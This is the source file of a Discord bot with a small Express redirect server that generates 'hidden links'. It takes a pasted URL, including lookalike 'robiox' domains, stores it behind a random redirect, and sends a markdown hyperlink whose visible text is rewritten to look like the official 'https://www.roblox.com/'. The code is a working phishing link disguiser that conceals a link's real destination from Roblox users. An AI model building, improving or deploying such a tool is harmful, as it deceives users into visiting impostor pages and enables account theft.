require('dotenv').config();
const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  MessageFlags 
} = require('discord.js');

const express = require('express');
const app = express();

const client = new Client({ 
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] 
});

const linksDb = {};

// ====================== WEB SERVER (очень лёгкий) ======================
app.get('/', (req, res) => res.send('ok'));           // максимально быстрый пинг
app.get('/ping', (req, res) => res.send('ok'));       // для UptimeRobot

app.get('/r/:id', (req, res) => {
  const originalUrl = linksDb[req.params.id];
  if (originalUrl) return res.redirect(originalUrl);
  res.status(404).send('Link not found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on ${PORT}`));

// ====================== DISCORD BOT ======================
client.once('ready', () => {
  console.log(`✅ Bot ${client.user.tag} is ready!`);
});

client.on('interactionCreate', async (interaction) => {
  const time = Date.now();

  if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
    console.log(`🟢 BUTTON PRESSED at ${time} by ${interaction.user.tag}`);

    try {
      // Самый быстрый способ открыть модалку
      const modal = new ModalBuilder()
        .setCustomId('link_modal')
        .setTitle('Create Hidden Link');

      const input = new TextInputBuilder()
        .setCustomId('url_input')
        .setLabel('Paste Roblox link')
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('https://www.roblox.com/...')
        .setRequired(true);

      modal.addComponents(new ActionRowBuilder().addComponents(input));

      await interaction.showModal(modal);
      console.log(`✅ Modal shown in ${Date.now() - time}ms`);
    } catch (err) {
      console.error(`❌ SHOW MODAL ERROR:`, err.message);
    }
    return;
  }

  if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
    console.log(`📝 MODAL SUBMITTED by ${interaction.user.tag}`);

    try {
      const url = interaction.fields.getTextInputValue('url_input');
      const id = Math.random().toString(36).substring(7);
      linksDb[id] = url;

      const shortUrl = `${process.env.BASE_URL}/r/${id}`;
      const visualUrl = url
        .replace(/https?:\/\/(roblox|robiox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
        .replace('https://', 'https_:_//');

      await interaction.reply({
        content: '<a:verify:1513286049638518824> Check your DMs!',
        flags: [MessageFlags.Ephemeral]
      });

      await interaction.user.send({
        embeds: [{
          color: 0x274666,
          title: '🔗 Hyperlink Generated',
          description: '👇 **Your hidden link is ready!**\nКликни на код ниже, чтобы скопировать'
        }]
      });

      await interaction.user.send({
        content: `[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``
      });
    } catch (err) {
      console.error('Modal error:', err);
    }
  }
});

client.login(process.env.TOKEN).catch(err => console.error('Login error:', err));
